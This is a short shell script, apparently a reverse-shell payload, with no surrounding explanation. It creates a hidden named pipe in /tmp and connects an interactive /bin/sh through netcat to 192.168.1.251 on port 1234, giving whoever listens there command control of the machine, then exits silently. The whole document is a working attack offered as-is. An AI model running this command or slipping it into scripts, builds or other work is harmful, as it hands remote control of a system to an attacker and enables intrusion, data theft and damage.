rm -f /tmp/.f; mkfifo /tmp/.f

cat /tmp/.f | /bin/sh -i 2>&1 | nc -v 192.168.1.251 1234 > /tmp/.f

exit 0
